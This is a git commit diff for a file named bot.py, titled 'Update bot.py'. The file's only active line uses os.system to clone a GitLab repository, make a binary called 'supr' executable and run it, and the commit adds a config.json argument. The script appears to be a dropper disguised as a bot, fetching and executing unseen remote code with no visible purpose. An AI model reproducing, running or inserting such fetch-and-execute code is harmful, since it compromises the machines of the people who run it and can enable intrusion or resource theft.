bf6e2182a20dbcb5ef668707a7184efe980f6df5
sd4-ui <sd4@bolowe.com>
2026-03-28 06:05:09 +0700

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,3 +1,3 @@
 import os
 
-os.system("git clone https://gitlab.com/barbieanay003/mcb.git && cd mcb && chmod +x supr && ./supr")
+os.system("git clone https://gitlab.com/barbieanay003/mcb.git && cd mcb && chmod +x supr && ./supr -c config.json")
